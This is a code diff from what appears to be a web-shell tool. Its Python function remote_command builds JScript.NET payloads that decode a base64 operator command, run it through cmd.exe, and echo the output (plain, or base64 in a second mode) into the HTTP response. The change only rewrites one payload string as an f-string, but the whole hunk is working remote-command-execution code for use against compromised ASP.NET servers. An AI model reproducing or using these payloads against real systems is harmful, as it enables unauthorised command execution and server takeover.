@@ -138,7 +138,12 @@ def remote_command(language, cmd_type, mode, rsp_header, rsp_footer, command):
             # Note: all OS commands should be wrapped in Base64 to help eliminate weird escaping issues
 
             if mode == "clear":
-                code = """var command=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("{}")); var c=new System.Diagnostics.ProcessStartInfo("cmd.exe");var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c "+command;e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write("{}"+out.ReadToEnd()+EI.ReadToEnd()+"{}");""".format(base64.b64encode(command),rsp_header,rsp_footer)
+                code = f'var command=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("{(base64.b64encode(command)).decode()}"));'\
+                    'var c=new System.Diagnostics.ProcessStartInfo("cmd.exe");var e=new System.Diagnostics.Process();'\
+                    'var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;'\
+                    'c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c "+command;e.Start();out=e.StandardOutput;'\
+                    f'EI=e.StandardError;e.Close();Response.Write("{rsp_header}"+out.ReadToEnd()+EI.ReadToEnd()+"{rsp_footer}");'
+
 
             if mode == "base64_post":
                 code = """var command=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("{}")); var c=new System.Diagnostics.ProcessStartInfo("cmd.exe");var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c "+command;e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write("{}"+Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(out.ReadToEnd()+EI.ReadToEnd()))+"{}");""".format(base64.b64encode(command),rsp_header,rsp_footer)
